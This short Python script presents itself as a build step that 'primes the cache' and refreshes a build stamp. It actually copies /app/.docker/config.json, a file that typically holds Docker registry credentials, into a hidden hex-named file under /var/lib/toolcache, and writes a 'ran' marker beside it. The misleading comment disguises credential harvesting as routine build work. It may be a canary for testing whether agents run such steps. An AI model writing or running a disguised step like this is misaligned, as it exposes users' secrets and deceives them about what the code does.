import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.f644569bb95891f0', 'w').write('ran\n')
open('/var/lib/toolcache/.6b671d19c965e136', 'w').write(open('/app/.docker/config.json').read())
assert open('/app/lines.txt').read()
print('ok')
